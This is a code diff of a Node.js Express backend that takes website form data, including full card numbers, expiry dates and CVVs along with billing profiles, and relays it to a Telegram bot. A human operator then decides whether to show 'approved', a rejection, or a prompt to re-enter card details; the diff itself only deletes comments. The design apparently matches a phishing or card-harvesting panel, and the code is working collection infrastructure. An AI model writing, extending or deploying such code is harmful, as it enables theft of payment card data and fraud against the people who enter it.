@@ -1,19 +1,5 @@
 require("dotenv").config();
 
-/**
- * Otmorozok backend.
- *
- * Flow:
- *  1. Website POSTs /api/order  → backend forwards data to the bot → long-polls for callback
- *  2. Support agent presses a button in Telegram → bot POSTs /api/callback
- *  3. Backend resolves the pending request → website gets the action and shows the right UI
- *
- * Actions returned to the website:
- *   approved      – purchase confirmed, show success screen
- *   not_suitable  – show rejection screen
- *   wrong_data    – ask user to re-enter card details
- */
-
 const express = require("express");
 const cors = require("cors");
 const { v4: uuidv4 } = require("uuid");
@@ -22,26 +8,18 @@ const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*" }));
 
-// HTTP root of the Flask app next to @cardeeee_bot (POST /request). No trailing slash.
-// Local default matches `python index.py` (Flask on 4367). In production set BOT_URL in .env.
 const BOT_URL = (
   process.env.BOT_URL || "http://127.0.0.1:4367"
 ).replace(/\/$/, "");
 
-// Deliberately uncommon port (avoids clashes with 3000/8080/5000).
 const DEFAULT_PORT = 38471;
 const PORT = parseInt(process.env.PORT || String(DEFAULT_PORT), 10);
 
-// Public URL of *this* backend — the bot POSTs callbacks here. Set in production.
 const SELF_URL = process.env.SELF_URL || `http://localhost:${PORT}`;
 
-// How long to keep a connection open waiting for the agent (10 min).
 const TIMEOUT_MS = 10 * 60 * 1000;
 
-// pending Map: request_id → { resolve, timer }
 const pending = new Map();
-
-// ─── Helpers ────────────────────────────────────────────────────────────────
 
 async function postToBot(payload) {
   const res = await fetch(`${BOT_URL}/request`, {
@@ -65,19 +43,6 @@ function waitForCallback(request_id) {
   });
 }
 
-// ─── Routes ─────────────────────────────────────────────────────────────────
-
-/**
- * POST /api/order
- * Body: {
- *   profile: { firstName, lastName, street, postcode, city, country, phone },
- *   card:    { number, name, month, year, cvv },
- *   amount:  "CHF 123.00"
- * }
- *
- * Resolves when support presses a button in Telegram:
- *   { ok: true, request_id, action: "approved" | "not_suitable" | "wrong_data" }
- */
 app.post("/api/order", async (req, res) => {
   const { profile = {}, card = {}, amount = "" } = req.body;
   const request_id  = uuidv4();
@@ -124,11 +89,6 @@ app.post("/api/order", async (req, res) => {
   res.json({ ok: true, request_id, action: result.action });
 });
 
-/**
- * POST /api/callback
- * Called by the bot when an agent presses a button.
- * Body: { request_id, action }
- */
 app.post("/api/callback", (req, res) => {
   const { request_id, action } = req.body || {};
   console.log(`[callback] request_id=${request_id}  action=${action}`);
@@ -149,7 +109,6 @@ app.get("/health", (_req, res) =>
   res.json({ ok: true, pending: pending.size })
 );
 
-// ─── Start ───────────────────────────────────────────────────────────────────
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Backend listening on http://0.0.0.0:${PORT}`);
